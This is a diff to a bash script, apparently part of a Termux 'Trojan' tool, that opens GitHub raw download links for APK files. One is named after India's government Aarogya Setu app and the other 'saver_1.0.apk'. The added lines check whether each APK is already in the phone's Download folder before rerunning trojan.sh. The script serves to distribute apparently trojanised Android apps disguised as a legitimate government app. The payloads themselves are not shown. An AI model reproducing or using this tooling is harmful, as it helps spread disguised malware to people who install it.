@@ -58,7 +58,12 @@ if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
 sleep 0.8
 echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 100
 xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/gov.aarogya_setu_1.1.1.apk?raw=true'
-else cd - > /dev/null 2>&1 && bash trojan.sh
+else if [ ! -f '/storage/emulated/0/Download/gov.aarogya_setu_1.1.1.apk' ];then
+cd - > /dev/null 2>&1 && bash trojan.sh
+fi
+if [ -f '/storage/emulated/0/Download/gov.aarogya_setu_1.1.1.apk' ];then
+bash trojan.sh
+fi
 fi
 echo
 sleep 1.0
@@ -83,7 +88,12 @@ if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
 sleep 0.8
 echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 
 xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/saver_1.0.apk?raw=true'
-else cd - > /dev/null 2>&1 && bash trojan.sh
+else if [ ! -f '/storage/emulated/0/Download/saver_1.0.apk' ];then
+cd - > /dev/null 2>&1 && bash trojan.sh
+fi
+if [ -f '/storage/emulated/0/Download/saver_1.0.apk' ];then
+bash trojan.sh
+fi
 fi
 echo
 sleep 1
